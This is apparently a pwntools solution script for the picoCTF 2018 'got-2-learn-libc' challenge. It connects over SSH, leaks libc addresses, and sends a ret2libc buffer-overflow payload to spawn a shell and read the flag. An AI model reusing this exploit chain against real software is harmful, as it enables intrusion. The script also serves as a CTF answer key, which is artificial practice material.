#!/usr/bin/python3

from pwn import *
from getpass import getpass

vuln = ELF('./vuln')

s = ssh(host='2018shell4.picoctf.com',user=input('[+] SSH username: '),password=getpass('[+] SSH password: '))
p = s.run('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee; ./vuln')

if not os.path.isfile('./libc.so.6'):
	s.get('/lib32/libc.so.6')

libc = ELF('./libc.so.6')
#libc = vuln.libc
libc_system = libc.symbols[b'system']
libc_exit = libc.symbols[b'exit']
libc_puts = libc.symbols[b'puts']
#binsh = next(libc.search('/bin/sh'))

# Leak puts
p.recvuntil('puts: ')
vuln_puts = int(p.recvline().decode('utf-8').strip('\n'),16)
p.recvuntil('useful_string: ')
binsh = int(p.recvline().decode('utf-8').strip('\n'),16)

offset_libc = vuln_puts - libc_puts
sys_addr = offset_libc + libc_system
exit_addr = offset_libc + libc_exit

padding = (160 * "A").encode('utf-8')

payload = padding + p32(sys_addr) + p32(exit_addr) + p32(binsh)

log.info("System: " + hex(sys_addr))
log.info("Exit: " + hex(exit_addr))
log.info("/bin/sh: " + hex(binsh))

p.recv()
p.sendline(payload)
p.sendline('cat flag.txt')
p.interactive()
s.close()
